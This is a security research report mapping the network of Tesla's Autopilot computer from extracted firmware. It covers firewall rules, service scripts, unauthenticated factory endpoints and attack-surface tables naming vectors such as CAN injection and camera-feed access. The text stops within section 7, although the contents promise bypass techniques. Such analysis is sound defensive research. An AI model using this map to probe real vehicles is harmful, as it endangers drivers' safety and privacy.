# Tesla APE (Autopilot) Network Architecture - Deep Dive

**Document Version:** 2.0  
**Analysis Date:** February 3, 2026  
**Platform:** Tesla Autopilot Hardware 2.x (HW2/HW2.5)  
**Source:** APE firmware extraction (`/firmware/ape-extracted/`)  
**Cross-reference:** 
- MCU network analysis: [04-network-ports-firewall.md](04-network-ports-firewall.md)
- APE services overview: [43-ape-network-services.md](43-ape-network-services.md)

---

## Executive Summary

This document provides a **comprehensive network security analysis** of Tesla's Autopilot Processing Engine (APE), focusing on:
- **Complete iptables firewall rulesets** (production & development)
- **62 service processes** managed by runit
- **Port-to-service mapping** with authentication analysis
- **MCU ↔ APE communication matrix** 
- **Subnet architecture** including dual-processor configurations (APE-A/APE-B)
- **Complete attack surface** with privilege boundaries

### Critical Security Findings

| Finding | Severity | Description |
|---------|----------|-------------|
| **Default-ACCEPT egress** | 🔴 CRITICAL | `-A OUTPUT ACCEPT` allows APE to initiate any outbound connection |
| **service-api (8901) unauthenticated** | 🔴 CRITICAL | Factory/diagnostic endpoints exposed without TLS |
| **mapmanager UID sandboxing weak** | 🟠 HIGH | Only restricts by UID, not network namespace |
| **DNS rejection at firewall** | 🟡 MEDIUM | Forces libnss_autopilot but rejects outbound DNS |
| **APE-B file server (8902)** | 🟡 MEDIUM | No authentication between APE-A and APE-B |

---

## Table of Contents

1. [APE Subnet Architecture](#1-ape-subnet-architecture)
2. [Complete iptables Firewall Rules](#2-complete-iptables-firewall-rules)
3. [APE Port Inventory](#3-ape-port-inventory)
4. [Service → Port Mapping](#4-service--port-mapping)
5. [MCU ↔ APE Communication Matrix](#5-mcu--ape-communication-matrix)
6. [APE Network Stack Analysis](#6-ape-network-stack-analysis)
7. [APE Attack Surface](#7-ape-attack-surface)
8. [Authentication & TLS Implementation](#8-authentication--tls-implementation)
9. [Firewall Bypass Techniques](#9-firewall-bypass-techniques)
10. [Security Recommendations](#10-security-recommendations)

---

## 1. APE Subnet Architecture

### 1.1 IP Address Assignments

```
┌────────────────────────────────────────────────────────────────────────┐
│                  192.168.90.0/24 - Primary Vehicle Network             │
├────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  192.168.90.100 ─ CID/ICE (MCU2 Infotainment Computer)                 │
│      ├─ Primary service consumer                                       │
│      ├─ SNI proxy on 8443 (TLS tunneling)                              │
│      ├─ Autopilot API on 8900                                          │
│      └─ DNS server (nameserver for APE)                                │
│                                                                          │
│  192.168.90.101 ─ IC (Instrument Cluster)                              │
│                                                                          │
│  192.168.90.102 ─ Gateway (GW)                                          │
│      └─ Routing between CAN bus and Ethernet                           │
│                                                                          │
│  192.168.90.103 ─ APE-A (Primary Autopilot Processor)                  │
│      ├─ Main autopilot compute node                                    │
│      ├─ Exposes service-api on 8901                                    │
│      ├─ Exposes service-api-tls on 8081                                │
│      ├─ Serves SSQ file system to APE-B on 8902                        │
│      └─ Default route: 192.168.90.100 (via MCU)                        │
│                                                                          │
│  192.168.90.104 ─ LB (Aurix Lockstep Processor / Low-level Bridge)     │
│      ├─ Sends CAN data via UDP 27694 → APE-A                           │
│      ├─ Sends Aurix logs via UDP 28205 → APE-A                         │
│      └─ Low-level safety-critical processor                            │
│                                                                          │
│  192.168.90.105 ─ APE-B (Secondary Autopilot Processor)                │
│      └─ Redundant autopilot compute (hot standby/load balancing)       │
│                                                                          │
└────────────────────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────────────────────┐
│       Additional VLAN Networks (APE /etc/hosts configuration)          │
├────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  192.168.91.103/105 ─ ap-macsec / ap-b-macsec                          │
│      └─ MACSec encrypted vehicle network (IEEE 802.1AE)                │
│                                                                          │
│  192.168.92.103/105 ─ ap-eth0.1 / ap-b-eth0.1                          │
│      └─ VLAN 1 on eth0 interface                                       │
│                                                                          │
│  192.168.95.103/105 ─ ap-eth1 / ap-b-eth1                              │
│      └─ Secondary Ethernet interface (eth1)                            │
│                                                                          │
│  192.168.96.103/105 ─ ap-eth1-macsec / ap-b-eth1-macsec                │
│      └─ MACSec on eth1                                                 │
│                                                                          │
│  192.168.97.103/105 ─ ap-eth1.1 / ap-b-eth1.1                          │
│      └─ VLAN 1 on eth1                                                 │
│                                                                          │
└────────────────────────────────────────────────────────────────────────┘
```

### 1.2 Network Interfaces

**Source:** `/firmware/ape-extracted/etc/network/interfaces`

```bash
auto lo
iface lo inet loopback

auto eth1
iface eth1 inet dhcp
```

**Observed interfaces in /etc/hosts:**

| Interface | APE-A IP | APE-B IP | Purpose |
|-----------|----------|----------|---------|
| eth0 | 192.168.90.103 | 192.168.90.105 | Primary vehicle network |
| eth0 (MACSec) | 192.168.91.103 | 192.168.91.105 | Encrypted vehicle network |
| eth0.1 | 192.168.92.103 | 192.168.92.105 | VLAN 1 tagged traffic |
| eth1 | 192.168.95.103 | 192.168.95.105 | Secondary network (DHCP) |
| eth1 (MACSec) | 192.168.96.103 | 192.168.96.105 | Encrypted secondary network |
| eth1.1 | 192.168.97.103 | 192.168.97.105 | VLAN 1 on eth1 |

**Default Route:**

```bash
# /etc/runit/1
route add default gw 192.168.90.100 mss 1240
```

**DNS Configuration:**

```bash
# /etc/resolv.conf
nameserver 192.168.90.100
```

**⚠️ Security Note:** APE has **no direct Internet access**. All external connectivity is proxied through MCU (192.168.90.100).

---

## 2. Complete iptables Firewall Rules

### 2.1 Firewall Architecture

**Master Script:** `/firmware/ape-extracted/sbin/firewall`

```bash
#!/bin/sh
die() {
    echo "!!! ERROR !!!"
    echo "$*"
    echo "Exiting..."
    exit 1
}

/usr/bin/is-apeb && export APEB="true"

cat <<EOF | iptables-restore --noflush || die "Failed to commit firewall rules"
# Set the default policies
*filter
:INPUT DROP [0:0]
:FORWARD DROP [0:0]
:OUTPUT ACCEPT [0:0]

# Create user-specific chains
:MAPMANAGER - [0:0]

# Allow returning traffic, ping, and all loopback
-A INPUT -i lo -j ACCEPT
-A INPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
-A INPUT -m conntrack --ctstate INVALID -j DROP
-A INPUT -p icmp -m icmp --icmp-type 8 -m conntrack --ctstate NEW -j ACCEPT

# Allow updater traffic
-A INPUT -p tcp --dport 25974 -j ACCEPT
-A INPUT -p tcp --dport 28496 -j ACCEPT

# Allow SSH traffic
-A INPUT -p tcp --dport 22 -j ACCEPT

# Allow service-api traffic
-A INPUT -p tcp --dport 8901 -j ACCEPT

# Allow CID-based canrx traffic
-A INPUT -i eth0 -s 192.168.90.100 -p udp --dport 31416 -j ACCEPT

# === MAPMANAGER ===
# Allow autopilot-api traffic
-A MAPMANAGER -o eth0 -p tcp --dport 8900 -d 192.168.90.100 -j ACCEPT
# Allow sniproxy traffic
-A MAPMANAGER -o eth0 -p tcp --dport 8443 -d 192.168.90.100 -j ACCEPT
# Reject all other multicast or local traffic
-A MAPMANAGER -d 10.0.0.0/8,172.16.0.0/12,192.168.0.0/16,127.0.0.0/8,225.0.0.0/8,224.0.0.0/4 -j REJECT
# Drop all other traffic
-A MAPMANAGER -j DROP
-A OUTPUT -m owner --uid-owner mapmanager -j MAPMANAGER

# Install platform-specific rules
$( [ -f /etc/firewall ] && source /etc/firewall )

# Install ap-a only rules
$( if [ -z "$APEB" ]; then
    # Allow receiving clip-logger local multicast traffic
    printf "%s\n" "-A INPUT -i eth0 -s 192.168.90.103 -d 224.0.0.154 -p udp --dport 5424 -j ACCEPT"
fi )

# Install development rules
$( if /sbin/detect-ecu-unfused; then
    [ -f /etc/firewall_dev ] && cat /etc/firewall_dev
fi )

# Reject Outbound DNS (handled by libnss_autopilot)
-A OUTPUT -p tcp --dport 53 -j REJECT
-A OUTPUT -p udp --dport 53 -j REJECT

COMMIT
EOF
```

### 2.2 Production Firewall Rules

**Source:** `/firmware/ape-extracted/etc/firewall`

```bash
# Ensure nobody can send canrx traffic except LB.
printf "%s\n" "-A INPUT -i eth0 -s 192.168.90.104 -p udp --dport 27694 -j ACCEPT"

# Allow Aurix data logging messages
printf "%s\n" "-A INPUT -i eth0 -s 192.168.90.104 -p udp --dport 28205 -j ACCEPT"

if [ -z "$APEB" ]; then
    # Allow ap's apeb-file-server to serve to ap-b
    printf "%s\n" "-A INPUT -i eth0 -s 192.168.90.105 -d 192.168.90.103 -p tcp --dport 8902 -j ACCEPT"
fi

# Allow service-api TLS traffic
printf "%s\n" "-A INPUT -i eth0 -p tcp --dport 8081 -j ACCEPT"
```

### 2.3 Development/Factory Firewall Rules

**Source:** `/firmware/ape-extracted/etc/firewall_dev`

**⚠️ WARNING:** These rules are applied on **unfused ECUs** (development or factory mode vehicles).

```bash
# Allow logdash traffic.
-A INPUT -p tcp --dport 8888 -j ACCEPT

# Allow metrics traffic.
-A INPUT -p tcp --dport 8088 -j ACCEPT

# Allow http-server traffic.
-A INPUT -p tcp --dport 8082 -j ACCEPT

# Allow vision traffic.
-A INPUT -p udp --dport 8610 -j ACCEPT
-A INPUT -p udp --dport 8611 -j ACCEPT

# Allow visualizer websocket traffic
-A INPUT -p tcp --dport 7699 -j ACCEPT

# Allow visualizer video traffic
-A INPUT -p tcp --dport 7700 -j ACCEPT

# Allow vision_graph_server gRPC traffic
-A INPUT -p tcp --dport 50051 -j ACCEPT

# Allow simulation control traffic
-A INPUT -p tcp --dport 9000 -j ACCEPT

# Allow data traffic from sensor 
-A INPUT -p udp --dport 2368 -j ACCEPT

# Allow UDS responses from sensor
-A INPUT -p udp --dport 2371 -j ACCEPT

# Allow NFS server ports
# portmapper/rpc.bind
-A INPUT -p tcp --dport 111 -j ACCEPT
-A INPUT -p udp --dport 111 -j ACCEPT

#nfsd
-A INPUT -p tcp --dport 2049 -j ACCEPT

#nfs.statd
-A INPUT -p tcp --dport 54959 -j ACCEPT
-A INPUT -p udp --dport 54959 -j ACCEPT

#nfs.mountd
-A INPUT -p udp --dport 59256 -j ACCEPT
-A INPUT -p tcp --dport 59256 -j ACCEPT

# Allow RTP traffic on eth0 through port 12000 for cabin audio streaming.
-A INPUT -p udp --dport 12000 -j ACCEPT

# Allow RTCP traffic on eth0 through port 12001 for cabin audio streaming.
-A INPUT -p udp --dport 12001 -j ACCEPT

# Allow UDP traffic on eth0 through port 8906 for ui-stats (ui-client) task
-A INPUT -p udp --dport 8906 -j ACCEPT
```

### 2.4 Critical Firewall Analysis

#### Default Policies

```iptables
:INPUT DROP [0:0]      # ✅ GOOD: Default deny inbound
:FORWARD DROP [0:0]    # ✅ GOOD: APE is not a router
:OUTPUT ACCEPT [0:0]   # ⚠️ RISK: Default allow outbound
```

**Security Issue:** `-A OUTPUT ACCEPT` means:
- APE can initiate connections to **any destination**
- No egress filtering (except DNS rejection)
- Compromised service can beacon to MCU or other ECUs

#### MAPMANAGER UID-based Sandboxing

```iptables
-A MAPMANAGER -o eth0 -p tcp --dport 8900 -d 192.168.90.100 -j ACCEPT  # MCU autopilot API
-A MAPMANAGER -o eth0 -p tcp --dport 8443 -d 192.168.90.100 -j ACCEPT  # MCU SNI proxy
-A MAPMANAGER -d 10.0.0.0/8,172.16.0.0/12,192.168.0.0/16,127.0.0.0/8,225.0.0.0/8,224.0.0.0/4 -j REJECT
-A MAPMANAGER -j DROP
-A OUTPUT -m owner --uid-owner mapmanager -j MAPMANAGER
```

**Security Analysis:**
- ✅ Restricts `map-manager` service to only 2 MCU endpoints
- ✅ Rejects RFC1918 private addresses
- ⚠️ Only uses UID matching (no network namespace isolation)
- ⚠️ If `mapmanager` UID is compromised, attacker can access MCU APIs

#### DNS Rejection

```iptables
-A OUTPUT -p tcp --dport 53 -j REJECT
-A OUTPUT -p udp --dport 53 -j REJECT
```

**Purpose:** Forces all DNS resolution through `libnss_autopilot` (custom NSS plugin)

**Source:** `/firmware/ape-extracted/etc/autopilot_hosts` (local DNS database)

**Security Implication:**
- ✅ Prevents DNS hijacking
- ✅ Ensures all domains resolve to MCU proxy (127.0.0.2 or 192.168.90.100)
- ⚠️ `/etc/autopilot_hosts` is writable by root (if root compromised, DNS can be hijacked)

---

## 3. APE Port Inventory

### 3.1 Production Ports (Always Exposed)

| Port | Proto | Service | Binary | Auth | Source Restriction | Risk |
|------|-------|---------|--------|------|-------------------|------|
| **22** | TCP | SSH | `/usr/sbin/sshd` | **SSH keys** | None (any) | 🟡 MEDIUM |
| **8901** | TCP | service-api | `/usr/bin/service_api` | **NONE** | None (any) | 🔴 **CRITICAL** |
| **8081** | TCP | service-api-tls | `/usr/bin/service_api` | **TLS + cert** | None (any) | 🟠 HIGH |
| **25974** | TCP | ape-updater | `/opt/autopilot/bin/updater` | Signed updates | None (any) | 🟠 HIGH |
| **28496** | TCP | updater-status | `/opt/autopilot/bin/updater` | None | None (any) | 🟡 MEDIUM |
| **8902** | TCP | apeb-file-server | `/opt/autopilot/bin/apeb-file-server` | **NONE** | 192.168.90.105 (APE-B) | 🟡 MEDIUM |
| **27694** | UDP | canrx | `/opt/autopilot/bin/canrx` | None | 192.168.90.104 (Aurix) | 🟢 LOW |
| **28205** | UDP | Aurix data log | `/opt/autopilot/bin/canrx` | None | 192.168.90.104 (Aurix) | 🟢 LOW |
| **31416** | UDP | CID canrx | `/opt/autopilot/bin/canrx` | None | 192.168.90.100 (MCU) | 🟡 MEDIUM |
| **5424** | UDP | clip-logger mcast | `/opt/autopilot/bin/clip_logger` | None | 192.168.90.103 (self) | 🟢 LOW |

### 3.2 Development/Factory Ports

| Port | Proto | Service | Binary | Purpose | Risk |
|------|-------|---------|--------|---------|------|
| **8888** | TCP | logdash | (hermes-grablogs HTTP) | Log streaming | 🟠 HIGH |
| **8088** | TCP | metrics | `/opt/autopilot/bin/metrics` | Prometheus metrics | 🟡 MEDIUM |
| **8082** | TCP | http-server | (generic HTTP) | Development API | 🟠 HIGH |
| **8610** | UDP | vision data | `/opt/autopilot/bin/vision` | Vision system output | 🟡 MEDIUM |
| **8611** | UDP | vision data | `/opt/autopilot/bin/vision` | Vision system output | 🟡 MEDIUM |
| **7699** | TCP | visualizer WS | (visualizer websocket) | Real-time debug UI | 🟠 HIGH |
| **7700** | TCP | visualizer video | (visualizer video stream) | Camera feed | 🔴 **CRITICAL** |
| **50051** | TCP | vision_graph gRPC | (gRPC server) | Vision graph control | 🟠 HIGH |
| **9000** | TCP | simulation ctrl | (simulation control) | HiL testing | 🟠 HIGH |
| **2368** | UDP | LiDAR data | (sensor input) | Velodyne LiDAR | 🟢 LOW |
| **2371** | UDP | LiDAR UDS | (sensor protocol) | LiDAR diagnostics | 🟢 LOW |
| **111** | TCP/UDP | RPC portmapper | `/sbin/rpcbind` | NFS support | 🟠 HIGH |
| **2049** | TCP | NFS | `/usr/sbin/nfsd` | Network file sharing | 🔴 **CRITICAL** |
| **54959** | TCP/UDP | NFS statd | `/sbin/rpc.statd` | NFS locking | 🟠 HIGH |
| **59256** | TCP/UDP | NFS mountd | `/sbin/rpc.mountd` | NFS mount daemon | 🟠 HIGH |
| **12000** | UDP | RTP audio | (audio streamer) | Cabin audio stream | 🟡 MEDIUM |
| **12001** | UDP | RTCP audio | (audio streamer) | RTCP control | 🟡 MEDIUM |
| **8906** | UDP | ui-stats | `/opt/autopilot/bin/ui_server` | UI metrics | 🟡 MEDIUM |

---

## 4. Service → Port Mapping

### 4.1 Runit Service Inventory

**62 services managed by runit** (`/etc/sv/` directory)

```
0001-ureadahead          Active-safety               Ape-updater
Apeb-file-server        Arbiter                     Aurix-console
Autopilot               Autopilot-b                 Autopilot-state-machine
Backup-camera           Camera                      Canrx
Cantx                   Clip-logger                 Clock-sync
Compressor              Connectivity-forwarder      Controller
Drivable-space-tracker  Driver-monitor              Emergency-audio
Factory-camera-calib    Fanctrl                     Field-calibration
Gadget-updater          Getty-console               Gps
Hermes                  Hermes-eventlogs            Hermes-grablogs
Hermes-teleforce        Hw-monitor                  Imu
Inertiator              Klog                        Lane-change
Localizer               Map-manager                 Metrics
Mission-planner         Parking-behavior            Perception
Rain-light-sensing      Road-estimator              Run-modes
Service-api             Service-api-tls             Shell-history-monitor
Snapshot                Snapshot-trigger-client     Sshd
Stay-in-lane            Syslog                      Telemetry
Telemetry-packager      Temperature-monitor         Text-log
Ubx-log                 Ui-server                   Updater-proxy
Vision                  Watchdog
```

### 4.2 Network-Exposed Services

#### **service-api (Port 8901)**

**Binary:** `/usr/bin/service_api`  
**Run script:** `/etc/sv/service-api/run`

```bash
#!/bin/sh
exec 2>&1

if [ -f /etc/build-date ]; then
        BUILD_DATE=$(cat /etc/build-date) || exit 1
        ARGS="$ARGS --build-date $BUILD_DATE"
fi

if ! /usr/bin/is-in-factory; then
        ARGS="$ARGS --requests-per-second 10 --requests-max-burst 10"
fi

/sbin/unload-apparmor-in-factory

echo "Boot $(/sbin/bootcount): Launching service-api with args \"$ARGS\" $(/sbin/uptime-seconds) s after boot"
exec /usr/bin/service_api $ARGS
```

**Authentication:** ❌ **NONE** (plaintext HTTP)

**Rate limiting:** 
- Production: 10 req/s, burst 10
- Factory: **UNLIMITED**

**Endpoints (from strings analysis):**
```
/autopilot/clear_telemetry
/board_info/board_revision
/board_info/ssh/principals
/board_info/cameras_init_done_for_apb
/vision/upload_calibration
/firmware_hash
/fuse
/odm_info
/factory_reset
/factory/enter
/factory/.calibration-start
/factory_calibration/status
/provisioning/genealogy/pcb
/provisioning/genealogy/tla
```

#### **service-api-tls (Port 8081)**

**Binary:** `/usr/bin/service_api` (same as above)  
**Run script:** `/etc/sv/service-api-tls/run`

```bash
#!/bin/sh
exec 2>&1

. /etc/tesla-certificates.vars

CA=$TESLA_CERTIFICATES_CURRENT_COMBINED_PRODUCT_ACCESS
CERT=/var/lib/board_creds/board.crt
KEY=/var/lib/board_creds/board.key
ENGINE=sw

if [ ! -f "$KEY" ] || [ ! -f "$CERT" ]; then
        # Fall back to self-signed certificate
        SELF_DIR=/var/run/service-api
        SELF_CERT=$SELF_DIR/server.crt
        SELF_KEY=$SELF_DIR/server.key

        ID=$(videntify) || ID=unprovisioned

        openssl req -new \
                    -x509 \
                    -nodes \
                    -newkey ec:"$PARAM_FILE" \
                    -keyout "$SELF_KEY" \
                    -subj "/CN=$ID/OU=Tesla Motors/O=Tesla/L=Palo Alto/ST=California/C=US" \
                    -days 365 \
                    -out "$SELF_CERT"
        CERT=$SELF_CERT
        KEY=$SELF_KEY
elif grep -q "BEGIN FSD TPM PRIVATE KEY" "$KEY"; then
        ENGINE=fsdtpm
fi

ARGS_OID_ENV="--oid-env $TESLA_CERTIFICATES_EKU_PRODUCT_ACCESS_CLIENT_AUTH_PROD"
if is-development-ape || is-in-factory; then
        ARGS_OID_ENV="${ARGS_OID_ENV} --oid-env $TESLA_CERTIFICATES_EKU_PRODUCT_ACCESS_CLIENT_AUTH_ENG"
fi

ARGS="$ARGS --tls \
            --ca $CA \
            --cert $CERT \
            --key $KEY \
            --engine $ENGINE \
            $ARGS_OID_ENV \
            --id-all tesla:motors:das:all \
            $ARGS_ID_DEVICE"

exec /usr/bin/service_api $ARGS
```

**Authentication:** ✅ **TLS mutual authentication**
- Client cert must be signed by Tesla CA
- Client cert must contain OID: `tesla:motors:das:all`
- Private key can be in TPM (`ENGINE=fsdtpm`)

**Fallback:** Self-signed certificate if board credentials missing

#### **canrx (Ports 27694, 28205, 31416)**

**Binary:** `/opt/autopilot/bin/canrx`  
**Run script:** `/etc/sv/canrx/run`

```bash
#!/bin/sh
exec 2>&1

bootcount=$(/sbin/bootcount)
export TESLA_ENABLE_GLOG=3

ANONYMIZATION_ARG=""
if /sbin/detect-ecu-unfused; then
    ANONYMIZATION_ARG="--log_without_anonymization"
fi

if /usr/bin/is-apeb; then
    APE_ID="ape-b"
else
    APE_ID="ape-a"
fi

DELIVERED_ARG=""
if [ -x /usr/bin/is-delivered ] && /usr/bin/is-delivered ; then
    DELIVERED_ARG="--delivered"
fi

if [ -x /sbin/plat_can_run_vars.sh ] ; then
    . /sbin/plat_can_run_vars.sh
    plat_can_setup
fi

ulimit -l unlimited -r 92 -q 53747712

echo "Boot $bootcount: Launching CAN RX $(/sbin/uptime-seconds) s after boot"
exec chpst -o 4096 -u canrx:canrx:autopilot:realtime:rtdv:ipc \
     /opt/autopilot/bin/canrx $ANONYMIZATION_ARG --ape_id $APE_ID $DELIVERED_ARG
```

**Purpose:** Receives CAN bus data over UDP from:
- **192.168.90.104** (Aurix/LB) → ports 27694, 28205
- **192.168.90.100** (MCU) → port 31416

**Authentication:** ❌ None (firewall restricts source IPs)

**User/Group:** `canrx:canrx` with groups `autopilot`, `realtime`, `rtdv`, `ipc`

**Priority:** Real-time scheduling (`ulimit -r 92`)

#### **apeb-file-server (Port 8902)**

**Binary:** `/opt/autopilot/bin/apeb-file-server`  
**Run script:** `/etc/sv/apeb-file-server/run`

```bash
#!/bin/sh
exec 2>&1

echo "Boot $(/sbin/bootcount): Launching apeb-file-server $(/sbin/uptime-seconds)s after boot"
while true; do
    IMGSIZE=$(curl http://192.168.90.103:28496/status 2>/dev/null | grep "Online dot-model-s size" | cut -d ':' -f 2)
    if [ -n "$IMGSIZE" ] ; then
       break
    fi

    IMGSIZE=$(curl http://192.168.90.103:28496/status?json 2>/dev/null | jq .online_size)
    if [ -n "$IMGSIZE" ] ; then
       break
    fi

    sleep 1
done
echo "Boot $(/sbin/bootcount): apeb-file-server found ssq size ($IMGSIZE bytes) in $(/sbin/uptime-seconds)s after boot. Starting server now"

BOOTPART=$(sed 's/.*bootpart=kernel-\(.\).*/\1/' < /proc/cmdline)

exec /opt/autopilot/bin/apeb-file-server $IMGSIZE $BOOTPART
```

**Purpose:** Serves SSQ filesystem from APE-A to APE-B
- Queries updater status on 28496 to get image size
- Serves filesystem over TCP 8902

**Authentication:** ❌ None (firewall restricts to 192.168.90.105)

#### **hermes-grablogs (Port 8888 - dev only)**

**Binary:** `/opt/hermes/hermes_grablogs`  
**Run script:** `/etc/sv/hermes-grablogs/run`

```bash
#!/bin/sh
exec 2>&1

. /etc/hermes.vars
. /sbin/plat_genealogy.sh

if [ -f "$HERMES_CREDS_CRT" ] && [ -f "$HERMES_CREDS_KEY" ] ; then
        sv -w 30 start hermes || exit 1
        SOCKET_ARGS="-unix-socket-path=/var/ipc/hermes.sock -unix-socket-proto=unixpacket"
        GRABLOGS_ARGS="-file-upload-path=/opt/hermes/hermes_fileupload"
fi

DEVICE_ID=unknown
if plat_get_genealogy "tla_pn" "$PN_FILE"; then
        DEVICE_ID=$(cat "$PN_FILE")
        if plat_get_genealogy "tla_sn" "$SN_FILE"; then
                DEVICE_ID="${DEVICE_ID}-$(cat "$SN_FILE")"
        fi
fi

/usr/bin/is-apeb && DEVICE_ID="${DEVICE_ID}-B"

DEBUG_ARGS="-log-level=info"
HTTP_ARGS="-http-unix-socket-path=/var/ipc/grablogs_http.sock -http-device-id=$DEVICE_ID"

ALLOWED_PATHS="-allowed-paths=/var/log/:/autopilot/:/home/factory/"
if /usr/bin/is-in-factory; then
        ALLOWED_PATHS="$ALLOWED_PATHS:/home/telemetry/"
fi

IGNORED_PATHS="-ignored-paths=/var/log/*/lock:/var/log/*/state:/var/log/lost+found*"

exec chpst -u hermes:hermes:ipc:log:autopilot \
     /opt/hermes/hermes_grablogs $ALL_ARGS "$ALLOWED_PATHS" "$IGNORED_PATHS"
```

**Purpose:** HTTP interface for log retrieval
- Exposes `/var/log`, `/autopilot`, `/home/factory` directories
- Unix socket: `/var/ipc/grablogs_http.sock`

**Authentication:** ❌ None (development firewall only)

#### **metrics (Port 8088 - dev only)**

**Binary:** `/opt/autopilot/bin/metrics`  
**Run script:** `/etc/sv/metrics/run`

```bash
#!/bin/sh
exec 2>&1

export TESLA_ENABLE_GLOG=3
export GLOG_minloglevel=2

ulimit -q 53747712
echo "Boot $(/sbin/bootcount): Launching metrics $(/sbin/uptime-seconds) s after boot"
exec chpst -o 4096 -u metrics:metrics:autopilot:ipc:rtdv /opt/autopilot/bin/metrics
```

**Purpose:** Prometheus-style metrics HTTP server

**Authentication:** ❌ None (development firewall only)

#### **ui-server (Port 8906 UDP - dev only)**

**Binary:** `/opt/autopilot/bin/ui_server`  
**Run script:** `/etc/sv/ui-server/run`

```bash
#!/bin/sh
exec 2>&1

export TESLA_ENABLE_GLOG=3

ulimit -l unlimited -r 78 -q 53747712
exec chpst -o 4096 -u uiserver:uiserver:autopilot:rtdv:ipc /opt/autopilot/bin/ui_server
```

**Purpose:** UI statistics/metrics streaming over UDP

**Authentication:** ❌ None

---

## 5. MCU ↔ APE Communication Matrix

### 5.1 MCU → APE Connections

| MCU Service | MCU Port | APE Port | Protocol | Purpose | Auth |
|-------------|----------|----------|----------|---------|------|
| **ICE (infotainment)** | - | 8901 | HTTP | Service API (factory/diag) | ❌ None |
| **ICE** | - | 8081 | HTTPS | Service API (TLS) | ✅ Mutual TLS |
| **ICE** | - | 22 | SSH | Debug shell access | ✅ SSH keys |
| **ICE** | - | 25974 | TCP | APE firmware updates | ✅ Signed images |
| **ICE** | - | 28496 | HTTP | Updater status query | ❌ None |
| **ICE** | - | 31416 | UDP | CAN RX data forwarding | ❌ None |
| **ICE (dev)** | - | 8888 | HTTP | Log retrieval (grablogs) | ❌ None |
| **ICE (dev)** | - | 8088 | HTTP | Metrics (Prometheus) | ❌ None |
| **ICE (dev)** | - | 8082 | HTTP | Generic HTTP server | ❌ None |
| **ICE (dev)** | - | 7699 | WS | Visualizer websocket | ❌ None |
| **ICE (dev)** | - | 7700 | HTTP | Visualizer video stream | ❌ None |
| **ICE (dev)** | - | 50051 | gRPC | Vision graph control | ❌ None |

### 5.2 APE → MCU Connections

| APE Service | APE Port | MCU Port | Protocol | Purpose | Auth |
|-------------|----------|----------|----------|---------|------|
| **map-manager** | - | 8900 | HTTP | Autopilot API (map data) | ✅ Firewall UID filter |
| **map-manager** | - | 8443 | HTTPS | SNI proxy (Tesla backend) | ✅ TLS |
| **hermes** | - | 8443 | HTTPS | Telemetry upload proxy | ✅ TLS |
| **All services** | - | 53 | DNS | ❌ REJECTED by firewall | N/A |

### 5.3 Inter-APE Communication (APE-A ↔ APE-B)

| Source | Destination | Port | Protocol | Purpose | Auth |
|--------|-------------|------|----------|---------|------|
| APE-B | APE-A | 8902 | TCP | SSQ filesystem server | ❌ None |
| APE-A | APE-A | 5424 | UDP | clip-logger multicast | ❌ None |

### 5.4 Aurix/LB → APE Communication

| Source | Destination | Port | Protocol | Purpose | Auth |
|--------|-------------|------|----------|---------|------|
| 192.168.90.104 | APE-A/B | 27694 | UDP | CAN RX data stream | ❌ Firewall IP filter only |
| 192.168.90.104 | APE-A/B | 28205 | UDP | Aurix data logging | ❌ Firewall IP filter only |

---

## 6. APE Network Stack Analysis

### 6.1 Custom DNS Resolution

**libnss_autopilot** replaces standard `libnss_dns`:

```bash
# /etc/nsswitch.conf (inferred)
hosts: files autopilot
```

**Local DNS database:** `/etc/autopilot_hosts`

```json
{
  "hosts": [
    {
      "hostname": "telemetry-*.ap.tesla.services",
      "address": "192.168.90.100"
    },
    {
      "hostname": "hermes-*.ap.tesla.services",
      "address": "192.168.90.100"
    },
    {
      "hostname": "api-*.ap.tesla.services",
      "address": "127.0.0.2"
    },
    {
      "hostname": "*.s3.ap.tesla.services",
      "address": "127.0.0.2"
    },
    {
      "hostname": "apmv3.go.tesla.services",
      "address": "192.168.90.100"
    },
    {
      "hostname": "firmware.vn.teslamotors.com",
      "address": "127.0.0.1"
    }
  ]
}
```

**Key observations:**
- All Tesla cloud services resolve to **192.168.90.100** (MCU)
- MCU acts as HTTP/HTTPS proxy to internet
- Iptables **rejects DNS queries** (port 53), forcing local resolution
- `127.0.0.2` hosts are blocked (probably resolved by other services)

### 6.2 Default Route & Internet Access

```bash
# /etc/runit/1
route add default gw 192.168.90.100 mss 1240
```

**MSS clamping:** Maximum Segment Size set to 1240 bytes (prevents MTU issues over cellular)

**Internet path:**
```
APE (192.168.90.103) 
  → MCU (192.168.90.100) 
    → Gateway (192.168.90.102)
      → Modem (192.168.90.60)
        → Cellular Network
          → Tesla Servers
```

**⚠️ Security Note:** APE has **no direct firewall rules preventing Internet access** except:
- Default route goes through MCU
- DNS is blocked (must use local resolution)
- `mapmanager` UID is restricted to MCU only

If an attacker gains root on APE:
1. Can add new routes to bypass MCU
2. Can install custom DNS resolver
3. Can exfiltrate data to arbitrary destinations

### 6.3 AppArmor Status

```bash
# /etc/sv/*/run scripts
/sbin/unload-apparmor-in-factory
```

**In factory mode:** AppArmor is **DISABLED**

**In production:** AppArmor profiles (if any) are loaded, but unclear which services are confined.

---

## 7. APE Attack Surface

### 7.1 Unauthenticated Network Services

| Port | Service | Attack Vector | Impact |
|------|---------|---------------|--------|
| **8901** | service-api | HTTP API injection, path traversal | 🔴 **CRITICAL** - Factory endpoints, file access |
| **28496** | updater-status | Information disclosure | 🟡 MEDIUM - Image size, boot partition |
| **8902** | apeb-file-server | Filesystem access from APE-B | 🟡 MEDIUM - If APE-B compromised |
| **27694** | canrx (UDP) | CAN data injection | 🟢 LOW - Requires spoofing 192.168.90.104 |
| **28205** | Aurix log (UDP) | Log injection | 🟢 LOW - Requires spoofing 192.168.90.104 |
| **31416** | canrx CID (UDP) | CAN data from MCU | 🟡 MEDIUM - Requires MCU compromise |

**Development/Factory Only:**

| Port | Service | Attack Vector | Impact |
|------|---------|---------------|--------|
| **8888** | logdash (grablogs) | Directory traversal, log exfiltration | 🟠 HIGH - Full /var/log, /autopilot access |
| **8088** | metrics | Information disclosure | 🟡 MEDIUM - System metrics |
| **8082** | http-server | Unknown API | 🟠 HIGH - Generic HTTP endpoint |
| **7699** | visualizer WS | Websocket injection | 🟠 HIGH - Real-time debug |
| **7700** | visualizer video | Camera feed access | 🔴 **CRITICAL** - Privacy violation |
